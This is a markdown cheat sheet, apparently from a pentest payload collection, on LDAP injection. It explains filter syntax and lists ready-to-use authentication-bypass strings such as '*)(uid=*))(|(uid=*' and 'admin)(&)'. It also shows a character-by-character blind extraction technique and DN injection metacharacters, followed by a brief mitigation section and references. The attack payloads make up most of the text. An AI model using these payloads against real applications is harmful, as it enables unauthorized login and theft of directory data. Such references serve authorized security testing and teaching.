# LDAP Injection

> LDAP Injection exploits unsanitized inputs in LDAP search filters, allowing attackers to alter the query.

## Summary

- [LDAP Filter Syntax](#ldap-filter-syntax)
- [Authentication Bypass](#authentication-bypass)
- [Blind LDAP Injection](#blind-ldap-injection)
- [DN Injection](#dn-injection)
- [Mitigation](#mitigation)
- [References](#references)

## LDAP Filter Syntax

```
( filter )
(!filter)
(&filter1 filter2)
(|filter1 filter2)
(attr=value)
(attr=*)
(attr~=value)         approx match
(attr>=value)
(attr<=value)
```

Wildcards: `*` matches any.

## Authentication Bypass

Assume the filter is `(&(uid=USER)(password=PASS))`.

```
user: *)(uid=*))(|(uid=*
pass: anything
```

Resulting filter:

```
(&(uid=*)(uid=*))(|(uid=*)(password=anything))
```

Other classics:

```
*
*)(&
*)(uid=*
*)(|(uid=*
admin)(&)
admin*
admin*)((|userpassword=*
admin)(!(&(1=0
admin)(|(password=*
admin)(!(password=*))
*)(objectClass=*
```

Empty/null password:

```
user: admin
pass:           (empty -> anonymous bind on some servers)
```

## Blind LDAP Injection

When the application returns one of two states (results / no results):

```
user=admin)(&)
user=admin)(!(...)
```

Iterate over each character:

```
user=admin)(description=a*
user=admin)(description=b*
...
user=admin)(description=ab*
```

Time-based blinds are usually not possible in pure LDAP, but boolean blinds work well.

## DN Injection

When user input ends up inside a Distinguished Name (rare but impactful):

```
cn=USER,ou=users,dc=target,dc=tld
```

Injection points are `,`, `=`, `+`, `;`, `\`, NUL, `<`, `>`, `#`, `"`, leading/trailing spaces. Library-specific behavior — test each.

## Mitigation

- Escape LDAP filter metacharacters per RFC 4515: `*`, `(`, `)`, `\`, NUL.
- Escape DN values per RFC 4514.
- Use libraries with parameterized filters (`ldap3` in Python, `UnboundID` in Java, etc.).
- Apply least-privilege bind accounts.

## References

- [OWASP — LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)
- [RFC 4515 — LDAP Search Filters](https://tools.ietf.org/html/rfc4515)
